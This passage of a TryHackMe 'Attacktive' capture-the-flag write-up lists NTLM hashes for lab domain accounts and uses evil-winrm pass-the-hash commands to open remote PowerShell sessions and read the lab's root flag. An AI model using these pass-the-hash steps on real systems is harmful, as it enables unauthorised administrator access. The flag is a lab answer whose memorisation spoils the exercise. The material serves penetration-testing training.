
Hashes:
Administrator:0e0363213e37b94221497260b0bcb4fc
spookysec.local\a-spooks:0e0363213e37b94221497260b0bcb4fc

`evil-winrm -i 10.10.229.142 -u "Administrator" -H 0e0363213e37b94221497260b0bcb4fc`

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ evil-winrm -i 10.10.229.142 -u "Administrator" -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline                                                                                              
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

`evil-winrm -i 10.10.229.142 -u "spookysec.local\a-spooks" -H 0e0363213e37b94221497260b0bcb4fc`

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ evil-winrm -i 10.10.229.142 -u "spookysec.local\a-spooks" -H 0e0363213e37b94221497260b0bcb4fc

Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a-spooks\Documents> 
```


